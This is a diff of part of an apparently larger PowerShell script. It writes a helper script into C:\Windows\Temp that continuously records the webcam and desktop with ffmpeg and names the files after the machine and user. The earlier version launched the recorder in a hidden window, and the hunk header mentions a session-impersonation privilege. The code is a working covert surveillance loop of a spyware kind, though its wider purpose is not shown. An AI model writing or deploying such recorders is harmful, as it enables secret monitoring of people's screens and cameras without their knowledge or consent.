@@ -4190,17 +4190,16 @@ SeDelegateSessionUserImpersonatePrivilege token."
 
     $script = {
       Start-Job -Name $(Get-Date -f hhmm-MM-dd-yyyy) -ScriptBlock {
-        while ($true){
-          if (-not (Get-Process ffmpeg)){
-            & 'C:\Windows\Temp\VTS\rc\ffmpeg-master-latest-win64-gpl-shared\bin\ffmpeg.exe' -f dshow -i video='Integrated Camera' -f gdigrab -framerate 5 -t 1800 -i desktop -filter_complex '[0:v]scale=320:-1[cam];[1:v][cam]overlay=10:10,scale=1280:720' 'C:\Windows\Temp\VTS\rc\T$(Get-Date -f hhmm-MM-dd-yyyy)-$($env:COMPUTERNAME)-$($env:USERNAME).mkv'
-          }
+          while ($true){
+            & 'C:\Windows\Temp\VTS\rc\ffmpeg-master-latest-win64-gpl-shared\bin\ffmpeg.exe' -f dshow -i video='Integrated Camera' -f gdigrab -framerate 5 -t 1800 -i desktop -filter_complex '[0:v]scale=320:-1[cam];[1:v][cam]overlay=10:10,scale=1280:720' "C:\Windows\Temp\VTS\rc\T$(Get-Date -f hhmm-MM-dd-yyyy)-$($env:COMPUTERNAME)-$($env:USERNAME).mkv"
+            (gps ffmpeg).WaitForExit()
         }
       }
     }
 
     Write-Host "Starting screen recording..."
     # Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -WindowStyle Hidden
-    Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -WindowStyle Hidden -PassThru
+    Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -PassThru #-WindowStyle Hidden
 
 }
 '@ | Out-File -FilePath C:\Windows\Temp\VTS\rc\start2.ps1 -Force -Encoding utf8
